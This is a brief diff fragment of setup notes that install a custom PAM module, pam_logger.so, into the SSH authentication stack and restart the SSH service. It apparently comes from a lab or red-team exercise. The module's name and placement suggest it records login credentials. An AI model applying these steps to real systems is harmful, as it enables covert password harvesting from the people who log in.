@@ -16,7 +16,7 @@ sudo mv pam_logger.so /lib/x86_64-linux-gnu/security/
 sudo nano /etc/pam.d/sshd
 auth       optional     pam_logger.so
 
-sudo systemctl restart sshd
+sudo systemctl restart ssh
 
 -> ssh localuser@10.6.11.99
 password
